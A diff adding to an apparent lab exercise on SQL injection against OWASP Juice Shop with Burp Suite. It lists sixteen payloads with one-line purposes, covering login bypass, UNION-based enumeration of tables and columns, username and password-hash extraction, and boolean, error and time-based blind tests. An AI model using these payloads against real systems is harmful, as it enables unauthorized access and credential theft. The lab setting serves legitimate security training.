@@ -5,6 +5,166 @@
 ## Aim
 To perform SQL Injection attack using Burp Suite on OWASP Juice Shop.
 
+
+1) Normal Input Test
+Payload:
+1
+
+Purpose:
+Checks normal application behavior and displays valid user details.
+
+--------------------------------------------------
+
+2) Authentication Bypass SQL Injection
+Payload:
+1' OR '1'='1
+
+Purpose:
+Bypasses authentication / displays all user records by making condition always TRUE.
+
+--------------------------------------------------
+
+3) Column Enumeration using ORDER BY
+Payload:
+1' ORDER BY 1-- -
+1' ORDER BY 2-- -
+1' ORDER BY 3-- -
+
+Purpose:
+Finds the total number of columns in the SQL query.
+The last successful query before error = total columns.
+
+--------------------------------------------------
+
+4) UNION-Based SQL Injection
+Payload:
+1' UNION SELECT 1,2-- -
+
+Purpose:
+Checks whether UNION injection works and identifies reflected columns.
+
+--------------------------------------------------
+
+5) Database Name Extraction
+Payload:
+1' UNION SELECT database(),2-- -
+
+Purpose:
+Extracts the current database name.
+
+--------------------------------------------------
+
+6) Table Enumeration
+Payload:
+1' UNION SELECT table_name,2 
+FROM information_schema.tables 
+WHERE table_schema=database()-- -
+
+Purpose:
+Displays all table names from the current database.
+
+--------------------------------------------------
+
+7) Column Enumeration
+Payload:
+1' UNION SELECT column_name,2 
+FROM information_schema.columns 
+WHERE table_name='users'-- -
+
+Purpose:
+Displays all column names from the users table.
+
+--------------------------------------------------
+
+8) Username and Password Extraction
+Payload:
+1' UNION SELECT user,password FROM users-- -
+
+Purpose:
+Extracts usernames and password hashes from the users table.
+
+--------------------------------------------------
+
+9) Comment-Based Injection
+Payload:
+' --
+' #
+'/*
+
+Purpose:
+Comments out the remaining SQL query to bypass conditions or ignore syntax.
+
+--------------------------------------------------
+
+10) Generic Login Bypass
+Payload:
+admin' --
+admin' OR '1'='1
+' OR 1=1 --
+' OR ''='
+
+Purpose:
+Bypasses login authentication.
+
+--------------------------------------------------
+
+11) Boolean-Based SQL Injection
+Payload:
+' AND 1=1 --
+' AND 1=2 --
+
+Purpose:
+Tests application response differences for TRUE and FALSE conditions.
+
+--------------------------------------------------
+
+12) Error-Based SQL Injection
+Payload:
+'
+''
+"`
+
+Purpose:
+Generates SQL errors to identify database vulnerabilities and error messages.
+
+--------------------------------------------------
+
+13) Time-Based Blind SQL Injection
+Payload:
+' AND SLEEP(5) --
+
+Purpose:
+Checks blind SQL injection using delayed server response.
+
+--------------------------------------------------
+
+14) Database Information Extraction
+Payload:
+' UNION SELECT database(),version() --
+' UNION SELECT user(),database() --
+
+Purpose:
+Extracts database name, database version, and current database user.
+
+--------------------------------------------------
+
+15) Full Table Enumeration
+Payload:
+' UNION SELECT table_name,null FROM information_schema.tables --
+
+Purpose:
+Lists all available tables from the database.
+
+--------------------------------------------------
+
+16) Full Column Enumeration
+Payload:
+' UNION SELECT column_name,null FROM information_schema.columns --
+
+Purpose:
+Lists all available columns from database tables.
+
+
 ---
 
 # PART 1 — Setup Juice Shop
